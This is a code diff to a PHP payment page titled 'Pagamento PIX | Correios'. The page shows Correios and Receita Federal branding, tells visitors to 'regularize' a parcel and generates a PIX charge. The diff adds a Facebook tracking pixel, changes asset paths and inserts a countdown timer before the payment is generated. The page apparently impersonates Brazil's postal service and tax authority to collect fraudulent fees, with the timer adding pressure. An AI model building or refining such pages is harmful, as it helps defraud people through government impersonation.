@@ -66,17 +66,18 @@ $codigoRastreio = $codigoRaw !== ''
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <script src="../assets/js/protect.js?v=20260814clear"></script>
-  <script src="../assets/js/pixel-loader-utmify.js"></script>
-  <script src="../assets/js/pixel-utmify.js?v=20261018purchase"></script>
   <meta name="theme-color" content="#003366">
+  <script>!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init','1794883931600243');fbq('track','PageView');</script>
+  <script src="/assets/js/protect.js?v=20260814clear"></script>
+  <script src="/assets/js/pixel-loader-utmify.js"></script>
+  <script src="/assets/js/pixel-utmify.js?v=20261018purchase"></script>
   <title>Pagamento PIX | Correios</title>
-  <link rel="stylesheet" href="../assets/css/correios-mobile.css?v=20260814k">
+  <link rel="stylesheet" href="/assets/css/correios-mobile.css?v=20260814k">
 </head>
 <body>
   <div class="page page-landing page-pix">
     <header class="landing-header">
-      <img src="../assets/img/logo-correios-header.png" alt="Correios" class="landing-logo-full" onerror="this.onerror=null;this.src='../assets/img/logo-correios.svg';">
+      <img src="/assets/img/logo-correios-header.png" alt="Correios" class="landing-logo-full" onerror="this.onerror=null;this.src='/assets/img/logo-correios.svg';">
     </header>
 
     <div class="landing-ssl">
@@ -88,7 +89,7 @@ $codigoRastreio = $codigoRaw !== ''
     <div class="landing-rf-wrap">
       <div class="landing-rf-bar">
         <div class="landing-rf-left">
-          <img src="../assets/img/logo-rf-header.png" alt="Receita Federal" class="landing-rf-logo" onerror="this.onerror=null;this.src='../assets/img/logo-receita.svg';">
+          <img src="/assets/img/logo-rf-header.png" alt="Receita Federal" class="landing-rf-logo" onerror="this.onerror=null;this.src='/assets/img/logo-receita.svg';">
           <span>Receita Federal</span>
         </div>
         <div class="landing-rf-right">
@@ -113,7 +114,7 @@ $codigoRastreio = $codigoRaw !== ''
 
     <div class="pix-order-card">
       <div class="pix-order-left">
-        <img src="../assets/img/icon-correios-setas.svg" alt="" class="pix-order-icon" aria-hidden="true">
+        <img src="/assets/img/icon-correios-setas.svg" alt="" class="pix-order-icon" aria-hidden="true">
         <div class="pix-order-info">
           <span class="pix-order-label">REGULARIZE SUA ENCOMENDA</span>
           <strong class="pix-order-code"><?php echo esc($codigoRastreio); ?></strong>
@@ -414,6 +415,7 @@ $codigoRastreio = $codigoRaw !== ''
   btnRetry.addEventListener('click', gerarPix);
 
   trackCheckoutOnce();
+  iniciarTimer();
   gerarPix();
 })();
 </script>
